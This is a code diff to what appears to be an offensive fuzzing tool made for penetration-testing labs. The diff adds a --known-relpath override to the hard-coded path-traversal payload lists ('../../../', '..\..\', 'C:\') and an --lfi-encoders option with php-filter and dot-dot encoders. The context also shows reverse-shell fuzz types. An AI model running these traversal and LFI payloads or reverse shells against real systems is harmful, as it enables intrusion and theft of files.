@@ -26,12 +26,21 @@ from .wordlists import wordlist_strip_prefix
 #           - Both for filenames in uploads but also for command injection? Test cmd injection on 16.3.4 Relaying Net-NTLMv2 lab 2
 
 def relpath_linux(args):
+    if args.known_relpath:
+        return [args.known_relpath.encode()]
+    
     return [b"", b"../", b"../../", b"../../../", b"../../../../../../../../../../../../", b"/", b"~/"]
 
 def relpath_windows(args):
+    if args.known_relpath:
+        return [args.known_relpath.encode()]
+    
     return [b"", b".\\", b"..\\", b"..\\..\\", b"..\\..\\..\\", b"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\", b"C:\\"]
 
 def relpath(args):
+    if args.known_relpath:
+        return [args.known_relpath.encode()]
+    
     return relpath_linux(args) + relpath_windows(args)
 
 FUZZ_TYPES = {
@@ -321,6 +330,11 @@ def main():
     parser.add_argument('--attackbox-web-port', type=int)
     parser.add_argument('--known-file')
     parser.add_argument('--known-part')
+    parser.add_argument('--known-relpath')
+    parser.add_argument('--lfi-encoders', nargs="+",
+                        choices=["id", "dot-dot", "dot-dot-slash", "php-filter"],
+                        default=["id", "dot-dot", "dot-dot-slash", "php-filter"],
+                        help="Encoders to use for LFI fuzzing.")
 
     args = parser.parse_args()
     
@@ -338,6 +352,10 @@ def main():
     
     if args.known_part and (args.known_part[0] == "/" or args.known_part[-1] != "/"):
         print("--known-part should not start with a slash, and it should end with one")
+        return
+    
+    if args.known_relpath and args.known_relpath[-1] != "/":
+        print("--known-relpath should end with a slash")
         return
 
     if ("revshell-linux" in args.types or "revshell-windows" in args.types) and args.threads > 1:
